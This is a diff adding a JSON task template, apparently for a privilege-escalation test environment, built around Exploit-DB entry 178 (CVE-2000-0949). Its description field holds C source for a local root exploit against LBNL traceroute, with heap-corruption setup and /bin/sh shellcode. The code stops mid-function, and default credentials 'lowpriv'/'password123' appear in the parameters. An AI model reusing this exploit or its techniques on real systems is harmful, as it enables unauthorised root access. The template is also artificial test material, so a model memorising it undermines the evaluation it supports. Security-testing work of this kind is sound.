@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_178",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: LBL Traceroute - Local Privilege Escalation (OSVDB-1584;CVE-2000-0949)\n\nExploit source code (178.c):\n```\n/*\n * MasterSecuritY <www.mastersecurity.fr>\n *\n * openwall.c - Local root exploit in LBNL traceroute\n * Copyright (C) 2000  Michel \"MaXX\" Kaempf <maxx@mastersecurity.fr>\n *\n * Updated versions of this exploit and the corresponding advisory will\n * be made available at:\n *\n * ftp://maxx.via.ecp.fr/traceroot/\n *\n * This program is free software; you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation; either version 2 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program; if not, write to the Free Software\n * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define PREV_INUSE 0x1\n#define IS_MMAPPED 0x2\n\nchar *\t\tfilename = \"/usr/sbin/traceroute\";\nunsigned int\tstack = 0xc0000000 - 4;\nunsigned int\tp = 0x0804ce38;\nunsigned int\tvictim = 0x0804c88c;\n\nchar * jmp = \"\\xeb\\x0aXXYYYYZZZZ\";\n\nchar * shellcode =\n\t/* <shellcode>:\t\txor\t%edx,%edx\t*/\n\t\"\\x31\\xd2\"\n\t/* <shellcode+2>:\tmov\t%edx,%eax\t*/\n\t\"\\x89\\xd0\"\n\t/* <shellcode+4>:\tmov\t$0xb,%al\t*/\n\t\"\\xb0\\x0b\"\n\t/* <shellcode+6>:\tmov\t$XXXX,%ebx\t*/\n\t\"\\xbbXXXX\"\n\t/* <shellcode+11>:\tmov\t$XXXX,%ecx\t*/\n\t\"\\xb9XXXX\"\n\t/* <shellcode+16>:\tmov\t%ebx,(%ecx)\t*/\n\t\"\\x89\\x19\"\n\t/* <shellcode+18>:\tmov\t%edx,0x4(%ecx)\t*/\n\t\"\\x89\\x51\\x04\"\n\t/* <shellcode+21>:\tint\t$0x80\t\t*/\n\t\"\\xcd\\x80\";\n\nchar * program = \"/bin/sh\";\n\nint zero( unsigned int ui )\n{\n\tif ( !(ui & 0xff000000) || !(ui & 0x00ff0000) || !(ui & 0x0000ff00) || !(ui & 0x000000ff) ) {\n\t\treturn( -1 );\n\t}\n\treturn( 0 );\n}\n\nint main()\n{\n\tchar\t\tgateway[ 1337 ];\n\tchar\t\thost[ 1337 ];\n\tchar *\t\targv[] = { filename, \"-g\", \"123\", \"-g\", gateway, host, NULL };\n\tunsigned int\tnext;\n\tint\t\ti;\n\tunsigned int\thellcode;\n\tunsigned int\tsize;\n\n\tstrcpy( host, \"AAAABBBBCCCCDDDDEEEE\" );\n\tnext = stack - (strlen(filename) + 1) - (strlen(host) + 1) + strlen(\"AAAA\");\n\tfor ( i = 0; i < next - (next & ~3); i++ ) {\n\t\tstrcat( host, \"X\" );\n\t}\n\tnext = next & ~3;\n\n\t((unsigned int *)host)[1] = 0xffffffff & ~PREV_INUSE;\n\t((unsigned int *)host)[2] = 0xffffffff;\n\tif ( zero( victim - 12 ) ) {\n\t\tfprintf( stderr, \"Null byte(s) in `victim - 12' (0x%08x)!\\n\", victim - 12 );\n\t\treturn( -1 );\n\t}\n\t((unsigned int *)host)[3] = victim - 12;\n\thellcode = p + (strlen(\"123\") + 1) + strlen(\"0x42.0x42.0x42.0x42\") + strlen(\" \");\n\tif ( zero( hellcode ) ) {\n\t\tfprintf( stderr, \"Null byte(s) in `host' (0x%08x)!\\n\", hellcode );\n\t\treturn( -1 );\n\t}\n\t((unsigned int *)host)[4] = hellcode;\n\n\tsize = next - (p - 4);\n\tsize = size | PREV_INUSE;\n\tsprintf(\n\t\tgateway,\n\t\t\"0x%02x.0x%02x.0x%02x.0x%02x\",\n\t\t((unsigned char *)(&size))[0]\n```",
+  "cve": "OSVDB-1584;CVE-2000-0949",
+  "exploitdb_id": "178",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_178",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
